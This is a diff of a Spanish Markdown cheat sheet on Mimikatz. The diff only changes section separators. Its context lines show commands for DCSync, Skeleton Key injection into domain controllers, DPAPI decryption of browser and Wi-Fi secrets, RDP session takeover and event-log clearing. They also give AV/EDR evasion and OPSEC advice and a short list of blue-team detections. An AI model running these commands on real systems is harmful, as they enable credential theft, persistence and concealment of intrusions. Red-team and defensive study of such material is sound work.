@@ -35,7 +35,7 @@ linked:
 
 # Mimikatz
 
-***
+---
 
 ## Overview
 
@@ -48,7 +48,7 @@ Toolkit C de Benjamin Delpy (gentilkiwi). Dump de credenciales LSASS, manipulaci
 
 > Regla: Mimikatz necesita **SeDebugPrivilege** + integridad alta (admin local) para tocar LSASS. Para SAM/LSA hives: **SYSTEM**. Defender lo flagea por signature — usar bypass AMSI/AV o variantes .NET in-memory.
 
-***
+---
 
 ## Setup + carga
 
@@ -85,7 +85,7 @@ pypykatz registry --sam SAM SYSTEM               # parse SAM offline
 pypykatz lsa --json minidump lsass.dmp > out.json
 ```
 
-***
+---
 
 ## Privilegios
 
@@ -102,7 +102,7 @@ mimikatz # token::list
 mimikatz # token::run /user:DOMAIN\admin cmd.exe
 ```
 
-***
+---
 
 ## Módulo `sekurlsa` — LSASS dump
 
@@ -190,7 +190,7 @@ pypykatz lsa minidump lsass.dmp
 
 Ver [[LSASS Dumping - Mimikatz Methods]] / [[LSASS Dumping - Modern EDR Evasion]].
 
-***
+---
 
 ## Módulo `lsadump` — SAM / LSA / NTDS
 
@@ -246,7 +246,7 @@ mimikatz # lsadump::dcsync /domain:child.domain.local /user:DOMAIN$
 
 Trust keys → forging inter-domain Golden Tickets (cross-forest).
 
-***
+---
 
 ## Módulo `kerberos` — ticket forge / ops
 
@@ -305,7 +305,7 @@ mimikatz # misc::skeleton
 
 Inyecta en LSASS del DC un master password ("mimikatz") válido para cualquier user. Persiste hasta reboot del DC. Ver [[Skeleton Key]].
 
-***
+---
 
 ## Módulo `dpapi`
 
@@ -340,7 +340,7 @@ mimikatz # dpapi::chrome /in:"C:\Users\alice\AppData\Local\Google\Chrome\User Da
 mimikatz # dpapi::wlan /in:"C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<GUID>\<profile>.xml"
 ```
 
-***
+---
 
 ## Módulo `crypto`
 
@@ -355,7 +355,7 @@ mimikatz # crypto::keys /export                               # exportar keys pr
 
 Útil para extraer certs cliente / cert ADCS no exportables (`/export` + `crypto::keys` bypass de `extractable=FALSE`).
 
-***
+---
 
 ## Módulo `vault`
 
@@ -366,7 +366,7 @@ mimikatz # vault::list
 
 Equivalente legacy de DPAPI Vault.
 
-***
+---
 
 ## Módulo `ts` — Terminal Services
 
@@ -376,7 +376,7 @@ mimikatz # ts::multirdp                                       # parche en runtim
 mimikatz # ts::remote /id:2                                   # take-over sesión RDP de otro user
 ```
 
-***
+---
 
 ## Módulo `misc`
 
@@ -393,7 +393,7 @@ mimikatz # misc::ncroutemon                                   # ver "NCrypt" pro
 
 Inyecta SSP en LSASS. Cada login subsiguiente loguea user+password en cleartext a `C:\Windows\System32\mimilsa.log`. Persiste hasta reboot.
 
-***
+---
 
 ## Módulo `privilege`
 
@@ -404,7 +404,7 @@ mimikatz # privilege::backup                                  # SeBackupPrivileg
 mimikatz # privilege::restore                                 # SeRestorePrivilege
 ```
 
-***
+---
 
 ## Módulo `event`
 
@@ -413,7 +413,7 @@ mimikatz # event::drop                                        # drop futuros eve
 mimikatz # event::clear                                       # clear log actual
 ```
 
-***
+---
 
 ## Variantes / wrappers in-memory
 
@@ -432,7 +432,7 @@ mimikatz # event::clear                                       # clear log actual
 
 Para EDR moderno: combinar dump silencioso (Dumpert / nanodump / comsvcs) + parse offline con pypykatz. Ver [[LSASS Dumping - Modern EDR Evasion]].
 
-***
+---
 
 ## Workflow típico Windows comprometido
 
@@ -468,7 +468,7 @@ Para EDR moderno: combinar dump silencioso (Dumpert / nanodump / comsvcs) + pars
 3. pypykatz lsa minidump dump.bin                  (offline en attacker)
 ```
 
-***
+---
 
 ## OPSEC
 
@@ -480,7 +480,7 @@ Para EDR moderno: combinar dump silencioso (Dumpert / nanodump / comsvcs) + pars
 - Skeleton Key sobre DC → masster password `mimikatz` con encryption type 0x17 + flagged por Microsoft ATA.
 - Para reducir signal: variantes .NET (`SharpKatz`), dump offline (nanodump/Dumpert), parse pypykatz fuera del host.
 
-***
+---
 
 ## Detecciones (blue team)
 
@@ -491,7 +491,7 @@ Para EDR moderno: combinar dump silencioso (Dumpert / nanodump / comsvcs) + pars
 - ASR rule `Block credential stealing from the Windows local security authority subsystem (lsass.exe)` (GUID `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2`).
 - LSA Protection (`RunAsPPL=1`) — bloquea handles a LSASS desde non-PPL. Bypass: BYOVD (drivers vulnerables) o KDU.
 
-***
+---
 
 ## Referencias
 
